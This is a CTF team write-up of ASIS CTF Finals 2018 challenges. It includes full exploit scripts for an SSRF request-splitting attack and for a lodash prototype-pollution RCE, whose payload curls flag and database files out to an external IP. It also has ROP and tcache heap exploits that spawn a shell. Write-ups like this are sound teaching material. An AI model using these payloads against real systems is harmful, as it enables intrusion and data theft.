# ASIS CTF Finals 2018

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20181124-asisctffinal/) of this writeup.**


 - [ASIS CTF Finals 2018](#asis-ctf-finals-2018)
   - [Web](#web)
     - [Proxy-Proxy](#proxy-proxy)
       - [Failed attempts](#failed-attempts)
     - [Secure API](#secure-api)
       - [Falled Attempts](#falled-attempts)
     - [SSL-VPN](#ssl-vpn)
       - [Failed Attempts](#failed-attempts-1)
   - [Crypto](#crypto)
     - [Made by baby](#made-by-baby)
   - [Forensic](#forensic)
     - [Red Bands](#red-bands)
   - [Reverse](#reverse)
     - [Bit square](#bit-square)
   - [Pwn](#pwn)
     - [Inception](#inception)
     - [Asvdb](#asvdb)
   - [PPC](#ppc)
     - [SPM](#spm)


## Web

### Proxy-Proxy

bookgin


First the server gives the link to `proxy/internal_website/public_notes` and `proxy/internal_website/public_links` in the landing page. I try to use different API endpoint like `proxy/internal_website/aaaa`, and the server returns all the availble API for me:

```javascript
available_endpoints = ['public_notes', 'public_links', 'source_code']
```

Let's check out `source_code` of the server:
```javascript
const express = require('express');
const fs = require('fs');
const path = require('path');
const body_parser = require('body-parser');
const md5 = require('md5');
const http = require('http');
var ip = require("ip");
require('x-date');

var server_ip = ip.address()

const server = express();
server.use(body_parser.urlencoded({
    extended: true
}));

server.use(express.static('public'))
server.set('views', path.join(__dirname, 'views'));
server.set('view engine', 'jade');
server.listen(5000)

server.get('/', function (request, result) {
    result.render('index');
    result.end()
})

function check_endpoint(available_endpoints, endpoint) {
    for (i of available_endpoints) {
        if (endpoint.indexOf(i) == 0) {
            return true;
        }
    }
    return false;
}

fs.readFile('flag.dat', 'utf8', function (err, contents) {
    if (err) {
        throw err;
    }
    flag = contents;
})

server.get('/proxy/internal_website/:page', function (request, result) {

    var available_endpoints = ['public_notes', 'public_links', 'source_code']
    var page = request.params.page

    result.setHeader('X-Node-js-Version', 'v8.12.0')
    result.setHeader('X-Express-Version', 'v4.16.3')

    if (page.toLowerCase().includes('flag')) {
        result.sendStatus(403)
        result.end()
    } else if (!check_endpoint(available_endpoints, page)) {
        result.render('available_endpoints', { endpoints: JSON.stringify(available_endpoints) })
        result.end()
    } else {
        http.get('http://127.0.0.1:5000/' + page, function (res) {

            res.setEncoding('utf8');
            if (res.statusCode == 200) {
                res.on('data', function (chunk) {
                    result.render('proxy', { contents: chunk })
                    result.end()
                });
            } else if (res.statusCode == 404) {
                result.render('proxy', { contents: 'The resource not found.' })
                result.end()
            } else {
                result.end()
            }
        }).on('error', function (e) {
            console.log("Got error: " + e.message);
        });
    }
})

server.use(function (request, result, next) {
    ip = request.connection.remoteAddress
    if (ip.substr(0, 7) == "::ffff:") {
        ip = ip.substr(7)
    }

    if (ip != '127.0.0.1' && ip != server_ip) {
        result.render('unauthorized')
        result.end()
    } else {
        next()
    }
})

server.get('/public_notes', function (request, result) {
    result.render('public_notes');
    result.end()
})

server.get('/public_links', function (request, result) {
    result.render('public_links');
    result.end()
})

server.get('/source_code', function (request, result) {
    fs.readFile('server.js', 'utf8', function (err, contents) {
        if (err) {
            throw err;
        }
        result.render('source_code', { source: contents })
        result.end()
    })
})


server.get('/flag/:token', function (request, result) {
    var token = request.params.token
    if (token.length > 10) {
		console.log(ip)
        fs.writeFile('public/temp/' + md5(ip + token), flag, (err) => {
            if (err) throw err;
            result.end();
        });
    }
})

server.get('/', function (request, result) {
    result.render('index');
    result.end()
})

server.get('*', function (req, result) {
    result.sendStatus(404);
    result.end()
});
```

The server basically behaves like a reverse proxy. Excluding `/proxy/interal_website`, all the other APIs require the connection from localhost. The main objective is visiting `/flag/:token` via `/proxy/internal_website/:page` but we have to find an approach to bypass the following constraints:

1. `:page` doesn't contain `flag`
2. `:page` starts with `public_notes`, `public_links` or `source_code`
3. cannot contain `/` (because `express` params is split by `/`)

Okay, so let's take a look at how many parser are parsing our request:
1. client browser (curl/firefox/chrome)
2. express parameter `:page`
3. nodejs `http` module
4. express router

Actually 1 is not necessary, but just a friendly reminder: your browser might parse your url first, e.g.: `/asd/../ggg` becomes `/ggg`.

The most possible parsers to exploit are 2 and 3. Note that the server even gives the version information. After a few fuzzing, I found in 2 you can pass some non-pritable chracter through percent-encoding. In 3 you can use backslash to represent `/`. 

However it's still not enough to bypass the constraint 2. 

Then I start to google some interesting information of path parsing. I remember in blackhat 2017, there is an great [SSRF slide by Orange Tsai from Taiwan](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf). Please refer to page 44.

In nodejs v8.12.0 http module:
```
http.get('http://localhost:1234/\uff2e\uff2e')

GET /.. HTTP/1.1
Host: localhost:1234
Connection: close
```

Actually we can do some CSRF injection here using `\uff0d\uff0a`. Another interesting ariticle of CSRF injection I found is [request splitting by Ryan Kelly](https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/). We can inject two CRLFs to make the nodejs socket send another request!

The rest is trivial. Just send the request to `/flag/:token`. Here is the final payload:

```python
#!/usr/bin/env python3
import hashlib
from urllib.parse import quote, unquote
import socket                                                                                                          

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('162.243.23.15', 8002))

uni = { 
    '/': quote('\uff2f'.encode('utf-8')),
    ' ': quote('\uff20'.encode('utf-8')),
    '\n': quote('\uff0a'.encode('utf-8')),
    '\r': quote('\uff0d'.encode('utf-8')),
    'g': quote('\uff67'.encode('utf-8')),
}
print(uni)
payload = 'public_notes HTTP/1.1\r\n\r\nGET /flag/taiwannumberone HTTP/1.1\r\nVia:'
for c, encoded in uni.items():
    payload = payload.replace(c, encoded)
print(payload)
sock.send(f'GET /proxy/internal_website/{payload} HTTP/1.1\r\n\r\n'.encode())
print(*sock.recv(8192).split(b'\r\n'), sep='\n')
md5sum = hashlib.md5(b'127.0.0.1taiwannumberone').hexdigest()
sock.send(f'GET /temp/{md5sum} HTTP/1.1\r\n\r\n'.encode())
print(*sock.recv(8192).split(b'\r\n'), sep='\n')
sock.close()
```
You can also use double-encoding `%2561` to represent `a`, or backslash to represent `/` in order to bypass the constrinat.

#### Failed attempts
- Using `../` to bypass the constaint 2 in node `http` module
    - Actually node v11.0.0 supports this feature. We can pass the `/aaaaa/../flag`  to the parameter, the node `http` will resolve to `/flag` and send the request to `/flag`. However this doesn't work in node v8.12.0.
- Using `../` or percent encoding to bypass the constaint2 in `express` router
    - However `express` seems to parse the API very strictly...... I can't even make the express parsing incorrectly
    - `../` only works in static filepath, like `images/../images/image.png`.
- Write a fuzzing script to find characters which make the parser parsing incorrectly:
    - Nothing interesting in node v8.12, but this script help me to find this interesting payload in node v11.0.0
    - `http://localhost/abcde\..\def` becomes `http://localhost/def`

```javascript
const http = require('http');

function get(url) {
  return new Promise(resolve => {
    //console.log(JSON.stringify(url))
    try {
        http.get(url,r => {
        r.setEncoding('utf8');
        r.on('data', c => {
        if (c.indexOf('index') != -1 && r.statusCode == 200)
          resolve(console.log(url, c))
        if (c.indexOf('public_links') != -1 && r.statusCode == 200)
          resolve(console.log(url, c))
        else
          resolve();
      });
    }).on('error', e => resolve());
    } catch(e) {
      resolve();
    }
  });
}

var seeds = ['', '//', '\uff2f\uff2f', '\uff2e\uff2e', '%2f', '..', '..\\..\\', '..\\', '../', '\\\\', 'public_links', '/', '%2e%2e', '%252e%252e', '..', '.', '?', '%2f', '%252f', '%3f', '%253f', '\\\\', '\\', '%5c', '%255c', '\x00', '\x01', '\x02', '\x03', '\x04', '\x05', '\x06', '\x07', '\x08', '\t', '\n', '\x0b', '\x0c', '\r', '\x0e', '\x0f', '\x10', '\x11', '\x12', '\x13', '\x14', '\x15', '\x16', '\x17', '\x18', '\x19', '\x1a', '\x1b', '\x1c', '\x1d', '\x1e', '\x1f', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`', '{', '|', '}', '~', '\x7f']

;
(async () => {
  for (let i of seeds)
  for (let j of seeds)
  for (let k of seeds){
    url = 'http://127.0.0.1:5000/public_notes' + i+j+k
    await get(url)
  }
})()

```

### Secure API

bookgin

We are given a nodejs API which we can read/write the notes. Follow the instruction on the landing page and visit `/help`, and we can see a hidden file fetcher API:

```json
{
  "API":"JS Fetcher, ver Beta","endpoints": [{
      "endpoint":"/fetchJSAPI/fetch",
      "method":"GET",
      "description":"Fetch a JS file and show it.",
      "params":{"path":"The file path"}
    }]
}
```
Okay, let's try to guess the filename of the server. Visiting `/fetchJSAPI/fetch/server.js`, it turns out the server is named `server.js`. Note that the param must end in `.js`. Otherwise the server will not return the file content.

```javascript
const express = require('express');
const path = require('path');
const body_parser = require('body-parser');
const FileSync = require('lowdb/adapters/FileSync')
const lowdb = require('lowdb');

const adapter = new FileSync('db.json')
const db = lowdb(adapter)


const server = express();
server.use(express.static('public'))
server.set('views', path.join(__dirname, 'views'));
server.set('view engine', 'jade');
server.listen(4000)

server.use(body_parser.json({ type: 'application/*+json' }))
server.use(body_parser.urlencoded({ extended: true }));

var routes = require('./api/routes/routes');
routes(server);

server.get('*', function (req, result) {
    result.sendStatus(404);
    result.end()
});
```

The main script includes other routers in `./api/routes/routes`. However, most of the note API is not interesting because the `read-only` in `config.json` is set to true. We cannot create/delete a new note.  Here is the note router source code:

```javascript
'use strict';
const fs = require('fs');
const path = require('path')
const uuid = require('uuid');
const _ = require('lodash');
var notes_model = require('../models/notes_model');
const config = JSON.parse(fs.readFileSync(path.join(__dirname, '../../config.json')))

var utilities = require('../controllers/utilities');

exports.fetch_all_notes = function (req, res) {
    res.json(notes_model.notes.value());
    res.end()
};

exports.fetch_a_note = function (req, res) {
    var data = notes_model.notes_data.find({ "id": req.params.noteId, "key": req.params.noteKey }).value(data)

    if (typeof data === 'undefined') {
        res.json(utilities.send_result(false, "Either invalid node-data.id or node-data.key has been submitted."));
        res.end()
    } else {
        res.json(utilities.send_result(true, "Authorization has been granted. The note has been fetched from database.", data));
        res.end()
    }
};

exports.delete_a_note = function (req, res) {
    if (!config.read_only) {

        var data = notes_model.notes_data.remove({ "id": req.params.noteId, "key": req.params.noteKey }).write()

        if (!Object.keys(data).length) {
            res.json(utilities.send_result(false, "Either invalid node-data.id or node-data.key has been submitted."));
            res.end()
        } else {
            notes_model.notes.remove({ "id": req.params.noteId }).write()
            res.json(utilities.send_result(true, "Authorization has been granted. The note has been deleted.", { "data": data[0].id }));
            res.end()
        }
    }else{
        res.json(utilities.send_result(false, "This section is inactive duo to read-only mode.",{}));
    }
};

exports.make_a_note = function (req, res) {

    if ('notedata' in req.body && '0' in req.body.notedata) {
        var data_to_insert = req.body.notedata[0]
        if (!('owner' in data_to_insert) || !('description' in data_to_insert) || !('key' in data_to_insert) || !('note' in data_to_insert)) {
            var data_to_insert = _.merge({ "owner": "BLANK", "description": "BLANK", "key": "BLANK", "note": "BLANK" }, data_to_insert)
        }

        var id = uuid()
        var notes_data_1 = { "id": id, "owner": data_to_insert.owner, "description": data_to_insert.description }
        var notes_data_2 = { "id": id, "key": data_to_insert.key, "note": data_to_insert.note }

        if (!config.read_only) {

            notes_model.notes.push(notes_data1).write()
            notes_model.notes_data.push(notes_data2).write()

            res.json(utilities.send_result(true, "The note has been created.", { "public": notes_data_1, "secret": notes_data_2 }));
        } else {
            res.json(utilities.send_result(false, "The note has not been created duo to read-only mode.", { "public": notes_data_1, "secret": notes_data_2 }));
        }
    } else {
        res.end()
    }
};
```

In other APIs, the most suspicious one is `status`:

```javascript
'use strict';

const path = require('path')
const fs = require('fs');
const { exec } = require('child_process');
const config = JSON.parse(fs.readFileSync(path.join(__dirname, '../../config.json')))

exports.get_gtatus = function (req, res) {
    var commands = {
        "script-1": "uptime",
        "script-2": "free -m"
    };

    console.log(commands)

    for (var index in commands) {
        exec(commands[index], (err, stdout, stderr) => {
            if (err) {
                return;
            }

            console.log(`stdout: ${stdout}`);
        });
    }

    res.send('OK')
    res.end()
}

exports.app_config = function (req, res) {

    fs.readFile(config.app_root + 'package.json', { encoding: 'utf-8' }, function (err, data) {
        if (!err) {
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.write(data);
            res.end();
        }
    })
}
```

It will execute those innocuous shell commands when visiting this API, but how to manipulate the hard-coded commands? The first thought comes to my mind is [javascript prototype polution](https://github.com/HoLyVieR/prototype-pollution-nsec18). If we can modify the prototype we can inject arbitrary command!

The only thing we can control is through the note API. It use `lodash` to merge the note with empty one. Then I search the lodash vulnerability and find [this](https://snyk.io/test/npm/lodash/4.17.4) interesting. It's just what we needed - Prototype Pollution.

So the rest is trivial. Pollute the command object and get RCE of the server

```python
#!/usr/bin/env python3                                                                                                 
import json
import requests

s = requests.session()
data= {
        "notedata": [{"__proto__": {"script-3" : "curl 140.112.31.105:1234 -F 'a=@/flag' -F 'b=@/opt/db.json'", }}],
}
r = s.post('http://162.243.23.15:8003/noteAPI/make_a_note', headers={'Content-Type': 'application/javascript+json'}, data=json.dumps(data))
r = s.get('http://162.243.23.15:8003/status')
print(r.text)
print(r.status_code)
```

The remote server seems to have no `nc`, so I use curl to send the files.

#### Falled Attempts

- Trying to bypass the endswith `.js` check:
```javascript
exports.fetch = function (req, res) {
    var file_path = req.params.path
    var arr = file_path.split('.');

    if (arr.length > 1) {
        if (arr[arr.length - 1] == 'js') {
            fs.readFile(config.js_dir + file_path, { encoding: 'utf-8' }, function (err, data) {
                if (!err) {
                    res.writeHead(200, { 'Content-Type': 'text/html' });
                    res.write(data);
                    res.end();
                } else {
                    res.setHeader('JS-Files', 'test.js')
                    res.send(err)
                    res.end();
                }
            });
        } else {
            res.send('Only .js files.');
            res.end();
        }
    }else{
        res.send('Only .js files.');
        res.end();
    }
}
```

Although I can use percent-encoding `%2f` to send `/`, I can't bypass the file extension check.

Actually I don't have other failled attempts. If you cannot come out of Prototype pollution, don't be disappointed. At least you learn something new :)


### SSL-VPN

bookgin

Unsolved, for the compelte writeup please refer to [@YShahinzadeh](https://twitter.com/YShahinzadeh)'s [writeup](https://medium.com/@y.shahinzadeh/nodejs-ssrf-by-design-flaw-asis-final-2018-sslvpn-challenge-walkthrough-5ec4e87bcced)


Basically this is a SSRF challenge, using `@` to make the `google.com` part being interperted as HTTP Basic access authentication.

```
http://google.com@127.0.0.1:12345/abc

//send the request to 127.0.0.1:12345
```

I get the db.json through visiting `http://162.243.23.15:8000/db.json/`. Just append a slash.

It's silly I didn't solve this one, because I forget to try the empty string in the `path` parameter...... so I assume it must be `/`.

#### Failed Attempts

- CSRF injection in http module
    - But the http module works well with `../`, so I think it's not the vulnerable version.
- Gussing the other API in `http://162.243.23.15:8001`
    - Nothing interesting. The `echo` API even doesn't return anything if we access it directly.
- Add the header `X-SSLVPN-Request-Id: 9B60:6E97:25ADB08:45E4D17:5AE34BA4` in the requests
    - It's totally useless.


## Crypto


### Made by baby

FWEASD

We are provided with an encrypted png and an encrypt script.
Here is the encrypt function

```python=
from secret import exp, key

def encrypt(exp, num, key):
    assert key >> 512 <= 1
    num = num + key
    msg = bin(num)[2:][::-1]
    C, i = 0, 1
    for b in msg:
        C += int(b) * (exp**i + (-1)**i)
        i += 1
    try:
        enc = hex(C)[2:].rstrip('L').decode('hex')
    except:
        enc = ('0' + hex(C)[2:].rstrip('L')).decode('hex')
    return enc
    
flag = open('flag.png', 'r').read()
msg = int(flag.encode('hex'), 16)
enc = encrypt(exp, msg, key)

f = open('flag.enc', 'w')
f.write(enc)
f.close()
```

We can see that this function simply convert base-10 system to base-2 system, then interpret it as it is base-`exp` system, however, there are some more operation.
1. add `num`, which is `flag.png`, with a small number, `key`.
2. multiply `num` by `exp`, since in `encrypt()`, `i` start with 1.
3. add some small noise while interpreting base-2 system as it is base-`exp` system. 

So we can expect that, if we find the correct `exp`, and convert it to base-`exp` system, besides some low bits, most bits should 0 or 1.

We first bruteforce to find that `exp` may be 3. Then ignore the noise added and recover it with the following script.
```python=
# convert to base-num system
def rep(x, num):
    ret = []
    while num:
        q = num % x
        num = num // x
        ret.append(q)
    return ret


f = open('flag.enc', 'r')
flag = f.read().encode('hex')
flag = int(flag, 16)
print flag


c = 0
i = 1
ret = rep(3, flag)
ans = ''
print ret
cnt = 0
for num in list(reversed(ret)):
    cnt += 1
    num = int(num)
    if num == 1:
        ans += '1'
    elif num == 0:
        ans += '0'
    else:
        ans += '0'
try:
    pr = hex(int(ans, 2) // 2)[2:].rstrip('L').decode('hex')
except:
    pr = ('0'+hex(int(ans, 2) // 2)[2:].rstrip('L')).decode('hex')
f = open('test.png', 'w')
f.write(pr)
f.close()


```
However the output can not be recognized by image reader, since the last chunk of png, a.k.a. `IEND`, is broken. Simply recover it by hand, change last 9 bytes of the png to `\x49\x45\x4e\x44\xae\x42\x60\x82\x0a`, then we can find an a little bit blurred flag.png.

flag : `ASIS{n3w_g1f7_by_babymade_in_ASIS!!!}`




## Forensic

### Red Bands

FWEASD

We are provided with some sparse bundle disk image. First unzip them to get bands with size 8MB. Now simply use `binwalk` on them and we can find that there exist some image in band `5`.
Then `strings 5 | grep "flag"`, the output will show `flag.png`, apparently the flag is in band `5`. However after extract all image in band `5`, we can not found flag.
After a little bit of struggle, we try `strings -n 3 5 | grep "PNG"`, the output : 
```bash
PNG
PNG
PNG
PNG
```
However only two image is extracted by `binwalk -eM 5`, so we manually check headers by python, and found the third header of PNG is broken, it is `\x90PNG\r\n...` instead of `\x89PNG\r\n...`, simply fix it and extract, we got flag.

Here is the exploit script
```python=
f = open('5', 'rb')
x = f.read()
f.close()

idx = 0
while 1:
    place = x.find('PNG')
    if place <= 0:
        break
    f = open('_' + str(idx) + '.png', 'wb')
    x = x[place:]
    f.write('\x89' + x)
    f.close()
    x = x[3:]
    idx += 1

```

flag : `ASIS{Mac_OS_X_Sp4rs3_Bundl3_D15k_iM49E__b4nds_Are_LOppY!}`

## Reverse

### Bit square

FWEASD

We are given two files : `bit_square`, `flag.enc`
with `strace ./bit_square` we can see that it attempt to read `flag.png`, and write encrypted data into `flag.enc`
Open `bit_square` in IDA, we found that in function `sub_2395`, it process the input image byte by byte, and all the operation are reversable, simply reverse them and we can recover the `flag.png`
Exploit script : 
```python=
f = open('flag.enc', 'r')
x = [ord(i) for i in f.read()]
cnt = 0
idx = 0
ans = ''
# we should first recover v9
# we can achieve this since PNG files have specific header "\x89PNG"
v9 = 96
while idx < len(x):
    if cnt % 4 == 0:
        v8 = (x[idx] - 114) & 0xff
        v7 = x[idx+1]
        ans += chr(v7 ^ v8 ^ ((v9+cnt) & 0xff))
        idx += 2
    elif cnt % 4 == 1:
        v7 = (x[idx] + 40) & 0xff
        v8 = x[idx+1]
        ans += chr(v7 ^ v8 ^ ((v9+cnt) & 0xff))
        idx += 2
    elif cnt % 4 == 2:
        v6 = cnt ** 3
        if v6 > 0x27:
            v8 = x[idx]
            v7 = x[idx+1]
        else:
            v7 = x[idx]
            v8 = x[idx+1]
        ans += chr(v7 ^ v8 ^ ((v9+cnt) & 0xff))
        idx += 3
    else:
        v7 = x[idx]
        v8 = x[idx+1]
        ans += chr(v7 ^ v8 ^ ((v9+cnt) & 0xff))
        idx += 3
    cnt += 1
f = open('origin.png', 'w')
f.write(ans)
f.close()
```

flag : `ASIS{3Xpla1n_h0w_it5_funnY$$$}`

## Pwn

### Inception

FWEASD

This is a simple ROP chal with multithread.
It spawn a child thread, and the main thread wait until child thread send "TRANSMISSION_OVER\x00", the child thread will read a string, and if `!strcmp("ASIS{N0T_R34LLY_4_FL4G}", input_string, )`, it will write user controlled buffer that can overflow main thread to main thread.
In both main thread and child thread can overwrite return address. However in child thread we can only use
1. sys_read
2. sys_write
3. sys_close
4. sys_exit
5. sys_exit_group

Apparently we have to get shell in main thread, so I leak libc in child thread and write one_gadget to main thread's return address.
Exploit script :
```python=
#!/usr/bin/python
from pwn import *

host = '37.139.17.37'
port = 1338

r = remote(host, port)

context.arch = 'amd64'

buf = 0x603000

write_plt = 0x400890
puts_plt = 0x0000000000400880
read_plt = 0x4008e0
puts_got = 0x0000000000602028

pop_rsi_r15 = 0x0000000000400cf1
pop_rdi = 0x0000000000400cf3

main_read = 0x400bb7
main_exit = 0x400c31

puts_base = 0x00000000000809c0
pop_rdx = 0x0000000000001b96
one_gadget = 0x4f322

r.recvuntil(':')
payload = 'ASIS{N0T_R34LLY_4_FL4G}\x00'.ljust(0x20, 'a')
payload += flat([buf-0x200, pop_rdi, puts_got, puts_plt, main_read])
r.sendline(payload)
r.recvuntil('Yeah tha')
libc = u64(r.recvn(6).ljust(8, '\x00')) - puts_base
print ('libc : ', hex(libc))
pop_rdx += libc
print ('pop_rdx : ', hex(pop_rdx))
one_gadget += libc
print ('one_gadget : ', hex(one_gadget))


time.sleep(1)
payload = 'ASIS{N0T_R34LLY_4_FL4G}\x00'.ljust(0x20, 'a')
payload += flat([buf-0x400, pop_rdi, 0, pop_rsi_r15, buf-0x400, 0, pop_rdx, 0x400, read_plt, pop_rdi, 10, pop_rsi_r15, buf-0x400, 0, pop_rdx, 0x400, write_plt, main_exit])
r.sendline(payload)

time.sleep(1)
payload = 'TRANSMISSION_OVER\x00'.ljust(0x28, 'a')
payload += flat([one_gadget])
r.sendline(payload)
r.interactive()
```

flag : `ASIS{2655b2e6fa6861246c9423c75d76c0e3}`

### Asvdb

FWEASD

In this chal we can 
1. add bug, which will allocate a bug struct
2. free bug, which will free(title) -> free(description) -> free(bug) -> clear pointer to bug
3. show bug, which will print all the content in a bug struct
```cpp=
// malloc(0x20)
struct bug{
    int year;
    int id;
    char *title = malloc(0x40);
    char *description = malloc(size);
    int severity;
};
```
we can input the `size`, if it smaller than 1 or it is bigger than 0xff, the `bug` will still be allocate, however the `description` pointer won't be overwrite. Then we can call free to trigger double free, thus we can do fast bin dup attack.
Additionally, this is deployed in Ubuntu18.04, which use tcache, so we can simply malloc to arbitary place. I malloc to `__free_hook` and overwrite it with a buf address, and the buf's content is `"/bin/sh\x00"`, then trigger free to get shell.

Exploit script : 
```python=
from pwn import *

host = '37.139.17.37'
port = 1337

context.arch = 'amd64'
r = remote(host, port)

def add(year, id, title, size, description, severity):
    r.recvuntil('>')
    r.sendline('1')
    r.recvuntil(':')
    r.sendline(str(year))
    r.recvuntil(':')
    r.sendline(str(id))
    r.recvuntil(':')
    if len(title) == 63:
        r.send(title)
    else:
        r.sendline(title)
    r.recvuntil(':')
    r.sendline(str(size))
    r.recvuntil(':')
    if size == 0:
        pass
    elif len(description) >= size - 1:
        r.send(description)
    else:
        r.sendline(description)
    r.recvuntil(':')
    r.sendline(str(severity))

def free(idx):
    r.recvuntil('>')
    r.sendline('3')
    r.recvuntil(':')
    r.sendline(str(idx))

def show(idx):
    r.recvuntil('>')
    r.sendline('4')
    r.recvuntil(':')
    r.sendline(str(idx))
    r.recvuntil('Description: ')
    return r.recvuntil('-----')[:-6]



free_got = 0x0000000000601fa0
free_base = 0x0000000000097950

__free_hook = 0x00000000003ed8e8

add(1, 1, '1', 0x68, 'a', 1) # 0
add(1, 1, '1', 0x68, 'a', 1) # 1
add(1, 1, '1', 0x68, 'a', 1) # 2
free(2)
free(0)

add(1, 1, '1', 0, '', 1) # 0
add(1, 1, '1', 0, '', 1) # 2
heap = u64(show(0).ljust(8, '\x00')) - 0x1e0
print ('heap : ', hex(heap))

free(0)
add(1, 1, '1', 0, '', 1) # 0
free(1)
free(0)


add(1, 1, '1', 0x68, p64(heap+0x60)+'a'*0x50+p64(0x71), 1) # 0
add(1, 1, '1', 0x68, 'a', 1) # 1
add(1, 1, '1', 0x68, p64(heap+0x60)+'a'*0x50+p64(0x71), 1) # 3

add(1, 1, '1', 0x68, 'a'*8+flat([0x31, 0, 0, free_got]), 1) # 4
libc = u64(show(1).ljust(8, '\x00')) - free_base
print ('libc : ', hex(libc))
__free_hook += libc
print ('__free_hook : ', hex(__free_hook))
free(4)
free(3)
free(0)
add(1, 1, '1', 0, '', 1) # 0
free(2)
free(0)

add(1, 1, '1', 0x68, p64(__free_hook), 1) # 0
add(1, 1, '1', 0x68, '/bin/sh\x00', 1) # 2
add(1, 1, '1', 0x68, p64(__free_hook), 1) # 3

add(1, 1, '1', 0x68, p64(system), 1) # 4

free(2)

r.interactive()

```
flag : `ASIS{2655b2e6fa6861246c9423c75d76c0e3}`

## PPC

### SPM

FWEASD

This is a simple PPC question. It ask us to find a integer $x$ , $\ s.t\ \ \  x^x\equiv a\pmod p$ where $p$ is a prime number.
Solution:
assume $x = n * p + a$ by Fermat's little theorem
$x^x\equiv (n*p+a)^{(n*p+a)}\equiv  a\pmod p$
now $let\ n+a=m*(p-1)+1$, so we can pick $m=1\Rightarrow n=p-a\Rightarrow x=p^2-a*p+a$

Exploit script : 
```python
from common import start

host = '37.139.4.247'
port = 60049

r = remote(host, port)

# this is too pass the PoW chal
start(r)

cnt = 0
while 1:
    try:
        cnt += 1
        print ('[{}]\tsolving...'.format(cnt))
        r.recvuntil('| send a solutoin of super hard equation x ** x = a (mod p), for given a and p')
        r.recvuntil('p = ')
        p = int(r.recvuntil('\n'))
        r.recvuntil('| a = ')
        a = int(r.recvuntil('\n'))

        # solve
        m = 1
        n = p - a
        x = int(n * p + a)
        r.sendline(str(x))
    except:
        r.interactive()
        exit()
```

flag : `ASIS{S1mple_T4sk_iN_S3lf_P0w3r_maP_eCMiJWd2PbuVJ}`



